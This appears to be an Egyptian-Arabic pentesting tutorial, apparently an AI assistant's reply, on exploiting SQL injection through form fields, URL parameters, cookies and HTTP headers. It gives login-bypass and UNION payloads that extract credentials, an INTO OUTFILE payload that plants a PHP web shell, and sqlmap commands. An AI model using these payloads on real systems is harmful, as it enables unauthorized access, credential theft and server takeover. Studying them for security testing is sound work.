تمام، هنشرح طرق استغلال SQL Injection بعمق عملي مع أكواد وأوامر، وهنركز على الجوانب اللي تهمك كـ pentester. هقسم الموضوع لطرق مختلفة، وبعد كل طريقة هحط خلاصة طريفة بالعامية المصرية، وفي الآخر هقدم خطوات عملية للاستغلال. يلا نبدأ!

---

# **1. استغلال SQL Injection عبر حقول الإدخال (Input Fields)**
## **إيه هو؟**
دا أكتر طريقة شائعة، بتحصل لما تستغل حقل في الموقع زي حقل لوجين أو بحث بتدخل فيه كود SQL عشان تتحكم في الاستعلام.

## **ازاي بيشتغل؟**
بتكتب أوامر في الحقل تخلي الداتابيز تنفذ حاجة غير اللي متوقعة، زي تخطي اللوجين أو سحب بيانات.

## **مثال عملي:**
### - **تخطي اللوجين:**
  #### - في حقل اليوزر نيم، اكتب:
  ```
  admin' OR '1'='1' --
  ```
##### شرح للامر :
![Pasted image 20250316162429.png](attachments/Pasted image 20250316162429.png)

  #### - وفي الباسوورد أي حاجة. الاستعلام هيبقى:
  ```
  SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = 'whatever';
  ```
  هيدخلك من غير ما تحتاج الباسوورد.

#### - **سحب بيانات:**
  في حقل بحث، اكتب:
  ```
  ' UNION SELECT 1, username, password FROM users --
  ```
  لو الموقع بيظهر نتايج البحث، هتظهرلك اليوزر نيم والباسوورد.

## **خلاصة طريفة:**
تخيل إنك بتقول للبواب "أنا أحمد أو أي حد عايز يدخل"، لو البواب سمع الكلام وفتح الباب، يبقى دخلت البيت من غير ما تعرف كلمة السر!

---

### **2. استغلال SQL Injection عبر معايير الـ URL (URL Parameters)**
#### **إيه هو؟**
لما يكون في باراميتر في الـ URL زي `id=1` متوصل بالداتابيز، ممكن تستغله بكود SQL.

#### **ازاي بيشتغل؟**
بتعدل الـ URL بإضافة أوامر SQL عشان تخلي الاستعلام يجيب بيانات أو يتجاوب بطريقة معينة.

#### **مثال عملي:**
- الـ URL الأصلي:  ==>قصده شكل ال Parameters في ال url
  ```
  http://example.com/product.php?id=1
  ```
- الاستعلام الداخلي: ==>قصده شكل Parameters في الداتا بيز من جوه
  ```
  SELECT * FROM products WHERE id = 1
  ```

- او لقيت شكل زي كده :
![Pasted image 20250316160920.png](attachments/Pasted image 20250316160920.png)


- **اختبار الثغرة:**  ==> دي الخطوه اللي انا بعملها لو لقيت شكل ال url زي م شوفت فوق كده
  ```
  http://example.com/product.php?id=1' OR '1'='1' --
  ```
  لو ظهرت كل المنتجات، يبقى في ثغرة.

- **سحب بيانات:**
  ```
  http://example.com/product.php?id=1' UNION SELECT 1, username, password FROM users --
  ```
  لو الصفحة بتظهر حاجة زي "admin:12345"، يبقى نجحت.

#### **خلاصة طريفة:**
تخيل إنك بتشتري حاجة من السوبر ماركت وبتقول "هاتلي المنتج رقم 1 أو كل الحاجات اللي في المخزن"، لو الكاشير جابلك كل حاجة، يبقى المخزن بتاعك!


## طب علشان تعرف ال Parameters اللي في الداتا بيز 

استخدم الاداه [[arjun]] بتجيبلك ال Parameters المخفيه

---

### **3. استغلال SQL Injection عبر الكوكيز (Cookies)**
#### **إيه هو؟**
لما الموقع بيستخدم قيم الكوكيز في استعلامات SQL، ممكن تعدلها عشان تستغل الثغرة.

#### **ازاي بيشتغل؟**
بتعدل الكوكيز باستخدام أدوات زي "Edit This Cookie" أو Burp Suite، وبتحط كود SQL.

#### **مثال عملي:**
- الكوكيز الأصلية:
  ```
  user_id=123
  ```
  الاستعلام:
  ```
  SELECT * FROM users WHERE id = 123
  ```

- **تعديل الكوكيز:**
  عدل `user_id` لـ:
  ```
  123' OR '1'='1 --
  ```
  لو الموقع فتحلك حسابات كتير أو بيانات زيادة، يبقى شغال.

- **سحب بيانات:**
  ```
  123' UNION SELECT 1, database(), version() --
  ```
  لو ظهر اسم الداتابيز أو الإصدار، يبقى نجحت.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحب المحل "بطاقتي بتقول أنا زبون رقم 123 أو أي زبون عنده فلوس"، لو جابلك كل البضاعة، يبقى الكوكيز فتحتلك الكنز!

---

### **4. استغلال SQL Injection عبر هيدرات HTTP (HTTP Headers)**
#### **إيه هو؟**
بعض المواقع بتستخدم قيم في الهيدرات (زي User-Agent أو Referer) في استعلامات SQL، وممكن تستغلها.

#### **ازاي بيشتغل؟**
بتعدل الهيدر باستخدام أدوات زي Burp Suite أو curl، وبتحط كود SQL.

#### **مثال عملي:**
- الهيدر الأصلي:
  ```
  User-Agent: Mozilla/5.0
  ```
  الاستعلام:
  ```
  SELECT * FROM logs WHERE user_agent = 'Mozilla/5.0'
  ```

- **تعديل الهيدر:**
  ```
  User-Agent: Mozilla/5.0' OR '1'='1 --
  ```
  لو الموقع رد ببيانات زيادة أو سلوك غريب، يبقى في ثغرة.

- **سحب بيانات:**
  ```
  User-Agent: Mozilla/5.0' UNION SELECT 1, username, password FROM users --
  ```

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "أنا جاي من عند محمد أو أي حد عنده فلوس"، لو فتحلك الباب وادالك كل المفاتيح، يبقى الهيدر فتحلك البيت كله!

---

### **5. استغلال SQL Injection لتنفيذ أوامر على السيرفر**
#### **إيه هو؟**
لو الداتابيز متصلة بصلاحيات عالية (زي MySQL مع `FILE` privileges)، ممكن تكتب ملفات أو تنفذ أوامر على السيرفر.

#### **ازاي بيشتغل؟**
بتستخدم أوامر زي `INTO OUTFILE` عشان تكتب ملف على السيرفر، وبعدين تستغله.

#### **مثال عملي:**
- **اختبار الصلاحيات:**
  ```
  ' UNION SELECT 1, @@version, @@datadir --
  ```
  لو رجعلك مسار الداتابيز (زي `/var/lib/mysql/`)، يبقى تقدر تكتب ملفات.

- **كتابة ملف:**
  ```
  ' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
  ```
  لو نجح، افتح:
  ```
  http://example.com/shell.php?cmd=whoami
  ```
  هيرجعلك اسم المستخدم بتاع السيرفر.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحب البيت "سيبلي ورقة أكتب فيها تعليمات للخدامين"، لو كتبته ونفذوها، يبقى بقيت إنت الكبير في البيت!

---

### **خطوات عملية للاستغلال كـ Pentester**
1. **اختبار الحقول:**
   - جرب `' OR '1'='1 --` في أي حقل (لوجين، بحث).
   - لو نجح، استخدم `UNION` لسحب البيانات.

2. **اختبار الـ URL:**
   - عدل أي باراميتر زي `id=1` لـ `id=1' OR '1'='1 --`.
   - لو ظهرت بيانات زيادة، اسحب بـ `UNION`.

3. **اختبار الكوكيز:**
   - افتح الكوكيز في المتصفح أو Burp Suite.
   - عدل قيمة زي `user_id` لـ `1' OR '1'='1 --` وشوف الرد.

4. **اختبار الهيدرات:**
   - استخدم Burp أو curl وعدل `User-Agent` لـ `' OR '1'='1 --`.
   - لو في تغيير في الرد، جرب `UNION`.

5. **تنفيذ أوامر:**
   - تأكد من مسار الكتابة بـ `@@datadir`.
   - اكتب شيل بـ `INTO OUTFILE` واختبره.

6. **استخدام sqlmap:**
   - لحقول الـ POST:
     ```
     sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --dbs
     ```
   - للـ URL:
     ```
     sqlmap -u "http://example.com/product.php?id=1" --dbs
     ```

#### **نصيحة:**
دوّن كل خطوة ونتايجها في تقريرك، وجرب كل طريقة لوحدها عشان تعرف أي طريقة شغالة.

---

ها، عايز أشرح حاجة زيادة أو أركز على طريقة معينة؟